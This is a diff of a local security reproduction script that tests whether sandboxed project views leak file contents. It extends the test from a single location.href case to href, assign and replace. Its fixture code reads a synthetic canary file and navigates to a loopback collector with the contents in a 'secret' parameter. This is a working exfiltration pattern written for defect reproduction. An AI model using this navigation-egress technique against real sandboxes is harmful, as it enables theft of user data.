@@ -1,5 +1,5 @@
 // Local-only security reproduction. Exit 0 means the known navigation leak
-// reached the collector; it NEVER means isolation or production acceptance.
+// reached the collector for every case; it NEVER means isolation or acceptance.
 import assert from 'node:assert/strict';
 import {createServer} from 'node:http';
 import {readFile, mkdir, writeFile} from 'node:fs/promises';
@@ -13,8 +13,7 @@ import {projectFiles, packaged} from '../../tests/m3/project-views-fixture.mjs';
 
 const root = new URL('../../', import.meta.url);
 const output = new URL('../../.local/project-view-isolation/navigation-egress-evidence.json', import.meta.url);
-const canary = 'SYNTHETIC_PROJECT_TEXT_' + randomUUID();
-const received = [], requests = [], browserErrors = [];
+const received = [], requests = [], browserErrors = [], cases = [];
 const listen = server => new Promise((resolve, reject) => {
   server.once('error', reject);
   server.listen(0, '127.0.0.1', () => resolve('http://127.0.0.1:' + server.address().port));
@@ -61,40 +60,56 @@ try {
   const collectorOrigin = await listen(sink);
   await fetch(collectorOrigin + '/control?case=collector-positive-control');
   assert(received.some(event => event.url.startsWith('/control?')));
-  const files = projectFiles();
-  files['docs/data.json'] = canary;
-  files['app/main.mjs'] = 'const value=await riffoid.readFile("docs/data.json");location.href=' + JSON.stringify(collectorOrigin + '/escape?case=self-href&secret=') + '+encodeURIComponent(value.text);';
-  fixture = await packaged(files);
   appOrigin = await listen(app); executionOrigin = await listen(execution);
   browser = await chromium.launch({headless: true, channel: process.env.M1_BROWSER_CHANNEL || 'chromium'});
-  const page = await browser.newPage();
-  page.on('request', req => requests.push({url: req.url(), method: req.method()}));
-  page.on('pageerror', error => browserErrors.push(error.message));
-  await page.goto(appOrigin);
-  await page.waitForFunction(() => Boolean(window.panel));
-  const matched = () => received.some(event => new URL(event.url, collectorOrigin).searchParams.get('secret') === canary);
-  const deadline = Date.now() + 5000;
-  while (!matched() && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 25));
+  for (const method of ['href', 'assign', 'replace']) {
+    const id = 'self-' + method, canary = 'SYNTHETIC_PROJECT_TEXT_' + randomUUID();
+    const target = JSON.stringify(collectorOrigin + '/escape?case=' + id + '&secret=') + '+encodeURIComponent(value.text)';
+    const files = projectFiles();
+    files['docs/data.json'] = canary;
+    files['app/main.mjs'] = 'const value=await riffoid.readFile("docs/data.json");' +
+      (method === 'href' ? 'location.href=' + target : 'location.' + method + '(' + target + ')') + ';';
+    fixture = await packaged(files);
+    const page = await browser.newPage();
+    try {
+      page.on('request', req => requests.push({case: id, url: req.url(), method: req.method()}));
+      page.on('pageerror', error => browserErrors.push({case: id, message: error.message}));
+      await page.goto(appOrigin);
+      await page.waitForFunction(() => Boolean(window.panel));
+      const matched = () => received.some(event => {
+        const url = new URL(event.url, collectorOrigin);
+        return url.pathname === '/escape' && url.searchParams.get('case') === id && url.searchParams.get('secret') === canary;
+      });
+      const deadline = Date.now() + 5000;
+      while (!matched() && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 25));
+      cases.push({id, packageIdentity: fixture.pkg.packageIdentity, filesSha256: fixture.pkg.filesSha256,
+        canarySha256: createHash('sha256').update(canary).digest('hex'),
+        result: matched() ? 'egress-observed' : 'not-observed-within-window'});
+    } finally {await page.close();}
+  }
+  const knownP1Reproduced = cases.some(value => value.result === 'egress-observed');
+  const matrixComplete = cases.length === 3 && cases.every(value => value.result === 'egress-observed');
   const sources = {};
-  for (const path of ['services/project-views/frame.mjs', 'services/web/project-views.js', 'services/project-views/package.ts', 'services/browser-preview/execution/index.ts']) {
+  for (const path of ['scripts/m3/project-view-navigation-repro.mjs', 'tests/m3/project-views-fixture.mjs', 'services/project-views/frame.mjs', 'services/web/project-views.js', 'services/project-views/package.ts', 'services/browser-preview/execution/index.ts']) {
     sources[path] = createHash('sha256').update(await readFile(new URL(path, root))).digest('hex');
   }
   const evidence = {
     schema: 'riffoid.project-view-navigation-reproduction/v1', startedAt, finishedAt: new Date().toISOString(),
     gitHeadAtExecution: execFileSync('git', ['rev-parse', 'HEAD'], {cwd: fileURLToPath(root), encoding: 'utf8'}).trim(),
+    trackedDiffAtExecution: execFileSync('git', ['diff', 'HEAD', '--name-only'], {cwd: fileURLToPath(root), encoding: 'utf8'}).trim().split('\n').filter(Boolean),
     sourceDigests: sources, node: process.version, browser: browser.version(),
     browserChannel: process.env.M1_BROWSER_CHANNEL || 'chromium', chromiumSandbox: false,
     scope: 'Synthetic fixtures; three loopback HTTP servers; no authenticated/cloud execution.',
     origins: {appOrigin, executionOrigin, collectorOrigin}, frameSha256: PROJECT_VIEW_FRAME_SHA256,
-    frameResponse, packageIdentity: fixture.pkg.packageIdentity, canarySha256: createHash('sha256').update(canary).digest('hex'),
-    received, requests, browserErrors, knownP1Reproduced: matched(), productionEligible: false,
-    result: matched() ? 'egress-observed' : 'not-observed-within-window',
-    interpretation: 'Exit 0 confirms reproduction of the known defect, never successful isolation. Absence within 5 seconds does not prove network isolation.',
+    frameResponse, cases,
+    received, requests, browserErrors, knownP1Reproduced, matrixComplete, productionEligible: false,
+    result: knownP1Reproduced ? 'egress-observed' : 'not-observed-within-window',
+    interpretation: 'Exit 0 confirms all three known self-navigation cases reproduced the defect, never successful isolation. Any received canary keeps P1 open. Absence within 5 seconds does not prove network isolation.',
   };
   await mkdir(new URL('./', output), {recursive: true});
   await writeFile(output, JSON.stringify(evidence, null, 2) + '\n');
-  console.log(JSON.stringify({knownP1Reproduced: matched(), productionEligible: false, evidence: fileURLToPath(output)}));
-  if (!matched()) process.exitCode = 1;
+  console.log(JSON.stringify({knownP1Reproduced, matrixComplete, productionEligible: false, evidence: fileURLToPath(output)}));
+  if (!matrixComplete) process.exitCode = 1;
 } finally {
   await browser?.close();
   for (const server of [sink, execution, app]) if (server.listening) {
